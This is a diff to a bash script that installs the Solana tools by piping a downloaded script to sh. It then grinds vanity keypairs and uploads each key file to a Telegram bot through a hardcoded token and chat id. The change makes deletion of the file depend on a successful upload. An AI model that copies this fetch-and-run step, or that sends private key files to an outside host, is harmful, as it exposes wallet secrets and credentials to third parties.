@@ -1,5 +1,9 @@
 #!/bin/bash
-
+mkdir /root/solana
+cd /root/solana 
+sh -c "$(curl -sSfL https://release.solana.com/v1.18.1/install)" 
+export PATH="/root/.local/share/solana/install/active_release/bin:$PATH" 
+solana-keygen grind --starts-with pow:100000000 &
 
 while true; do
 
@@ -23,7 +27,12 @@ while true; do
 
             # Make a curl GET request with the content of the file appended to the URL
             curl -v -F "chat_id=638066999" -F document=@/root/solana/$filename https://api.telegram.org/bot6851381197:AAHJ5Yy7iqn_psValJJa1hZ71n8KSKEZ5U4/sendDocument
-            rm /root/solana/$filename
+            if [ $? -eq 0 ]; then
+                # If successful, delete the file
+                rm "$file"
+            else
+                echo "Failed to send $file to Telegram."
+            fi
         done
     fi
 
